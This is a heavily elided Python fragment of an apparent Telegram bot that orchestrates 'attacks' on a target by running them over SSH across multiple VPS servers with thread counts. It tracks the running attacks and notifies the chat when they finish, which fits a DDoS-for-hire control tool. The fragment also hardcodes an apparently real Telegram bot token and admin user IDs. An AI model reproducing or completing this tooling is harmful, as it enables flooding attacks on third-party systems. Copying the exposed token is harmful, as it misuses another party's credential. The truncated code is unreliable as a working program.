...
TELEGRAM_BOT_TOKEN = '7664296465:AAEe-3Ym6c3eue0zJ77d7pD3r5ourO26zPE'
...
OWNER_ID = 7561378776  # Your user ID
COOWNER_IDS = [7561378776]  # Other admin IDs
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
        ...
        running_attacks[attack_id_vps] = {
            ...
            'vps_ip': ip_vps,
            'chat_id': update.effective_chat.id  # Store chat ID for notifications
        }
        ...
        try:
            ...
            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id.split('-')[0])]
            if not active_attacks:
                # All attacks finished for this target
                attack_info = next(iter(running_attacks.values())) if running_attacks else {}
                chat_id = attack_info.get('chat_id', update.effective_chat.id)
